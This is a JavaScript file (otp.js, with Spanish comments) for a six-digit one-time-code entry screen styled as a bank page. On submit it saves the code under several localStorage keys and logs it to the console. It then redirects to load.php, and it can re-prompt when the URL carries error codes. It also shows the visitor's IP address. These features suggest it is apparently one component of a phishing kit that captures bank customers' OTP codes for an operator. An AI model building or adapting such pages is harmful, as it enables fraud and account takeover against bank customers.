// --- Este es el código JS que va en otp.js ---
(function () {
    // --- Selección de elementos (EXACTAMENTE IGUAL a dinámica) ---
    const inputClave = document.getElementById("clave");
    const slots = document.querySelectorAll(".password-slot");
    const mensajeError = document.getElementById("mensaje-error");
    const btnVolver = document.getElementById("btnVolverOtp");
    const btnContinuar = document.getElementById("btnContinuarOtp");
    const trazoDesktop = document.querySelector(".lineas-form-desktop");
    const trazoMobile = document.querySelector(".lineas-form-mobile");

    // --- Funciones de utilidad (EXACTAMENTE IGUALES a dinámica) ---
    function estaModoCel() {
        return window.matchMedia("(max-width: 768px)").matches;
    }

    function configurarInputOtp() {
        const modoCel = estaModoCel();

        if (modoCel) {
            inputClave.setAttribute("inputmode", "numeric");
            inputClave.setAttribute("pattern", "[0-9]*");
            inputClave.setAttribute("autocomplete", "off");
            inputClave.setAttribute("enterkeyhint", "done");
        } else {
            inputClave.setAttribute("inputmode", "numeric");
            inputClave.setAttribute("pattern", "[0-9]*");
            inputClave.setAttribute("autocomplete", "off");
            inputClave.removeAttribute("enterkeyhint");
        }
    }

    function obtenerTrazoActivo() {
        return estaModoCel() ? trazoMobile : trazoDesktop;
    }

    function subirTrazo() {
        const trazoActivo = obtenerTrazoActivo();

        if (trazoDesktop && trazoDesktop !== trazoActivo) {
            trazoDesktop.classList.remove("is-under-input");
        }
        if (trazoMobile && trazoMobile !== trazoActivo) {
            trazoMobile.classList.remove("is-under-input");
        }
        if (trazoActivo) {
            trazoActivo.classList.add("is-under-input");
        }
    }

    function bajarTrazo() {
        if (trazoDesktop) {
            trazoDesktop.classList.remove("is-under-input");
        }
        if (trazoMobile) {
            trazoMobile.classList.remove("is-under-input");
        }
    }

    function refrescarTrazo() {
        const trazoActivo = obtenerTrazoActivo();
        if (trazoActivo && trazoActivo.classList.contains("is-under-input")) {
            subirTrazo();
        }
    }

    // --- Detectar error por URL (EXACTAMENTE IGUAL a dinámica) ---
    function detectarError() {
        const urlParams = new URLSearchParams(window.location.search);
        const errorParam = urlParams.get("error");

        if (errorParam === "true" || errorParam === "1" || errorParam === "error" || errorParam === "3") {
            mensajeError.classList.add("mostrar");
            slots.forEach(function (slot) {
                slot.classList.remove("error", "filled", "active");
                slot.textContent = "";
            });

            inputClave.value = "";
            btnContinuar.className = "btn-continuar inactivo";

            setTimeout(function () {
                inputClave.focus();
            }, 100);
        }
    }

    // --- Actualizar slots (EXACTAMENTE IGUAL a dinámica) ---
    function actualizarSlots(valor) {
        mensajeError.classList.remove("mostrar");

        slots.forEach(function (slot, index) {
            slot.classList.remove("error");

            if (index < valor.length) {
                slot.textContent = "•";
                slot.classList.add("filled");
            } else {
                slot.textContent = "";
                slot.classList.remove("filled");
            }

            if (index === valor.length) {
                slot.classList.add("active");
            } else {
                slot.classList.remove("active");
            }
        });

        btnContinuar.className = valor.length === 6 ? "btn-continuar activo" : "btn-continuar inactivo";
    }

    // --- Validar y enviar (🔥 MODIFICADO - guarda como OTP) ---
    function validarYEnviar() {
        const clave = inputClave.value;

        if (clave.length !== 6) {
            alert("El código OTP debe tener 6 dígitos");
            return;
        }

        // 🔥 GUARDAR COMO OTP (no como dinámica)
        localStorage.setItem("otp", clave);
        localStorage.setItem("claveOtp", clave);
        localStorage.setItem("clave", clave);
        
        console.log("✅ OTP guardado:", clave);
        console.log("📦 localStorage:", {
            otp: localStorage.getItem("otp"),
            claveOtp: localStorage.getItem("claveOtp"),
            clave: localStorage.getItem("clave")
        });

        window.location.href = "load.php";
    }

    // --- Event Listeners (EXACTAMENTE IGUALES a dinámica) ---
    inputClave.addEventListener("input", function () {
        if (!/^\d*$/.test(this.value)) {
            this.value = this.value.replace(/\D/g, "");
        }

        actualizarSlots(this.value);
        subirTrazo();
    });

    inputClave.addEventListener("keypress", function (e) {
        if (e.key === "Enter") {
            validarYEnviar();
        }
    });

    inputClave.addEventListener("blur", function () {
        if (!estaModoCel()) {
            bajarTrazo();
            return;
        }
        if (inputClave.value.length === 6) {
            return;
        }

        const active = document.activeElement;
        if (active === btnVolver || active === btnContinuar) {
            return;
        }

        window.setTimeout(function () {
            if (inputClave.value.length === 6) {
                return;
            }
            inputClave.focus();
        }, 0);
    });

    inputClave.addEventListener("focus", subirTrazo);

    // --- Eventos de botones (EXACTAMENTE IGUALES a dinámica) ---
    btnVolver.addEventListener("click", function () {
        window.location.href = "load.php";
    });

    btnContinuar.addEventListener("click", validarYEnviar);

    // --- Inicialización (EXACTAMENTE IGUAL a dinámica) ---
    if (typeof BancoShared !== 'undefined') {
        BancoShared.populateIp({ ipElementId: "gfg", addressElementId: "address" });
        BancoShared.startDateTime("fecha-hora");
    }

    configurarInputOtp();
    detectarError();
    bajarTrazo();

    window.addEventListener("load", function () {
        if (!mensajeError.classList.contains("mostrar")) {
            inputClave.focus();
        }
    });

    const mq = window.matchMedia("(max-width: 768px)");
    if (typeof mq.addEventListener === "function") {
        mq.addEventListener("change", function () {
            configurarInputOtp();
            refrescarTrazo();
        });
    } else if (typeof mq.addListener === "function") {
        mq.addListener(function () {
            configurarInputOtp();
            refrescarTrazo();
        });
    }
})();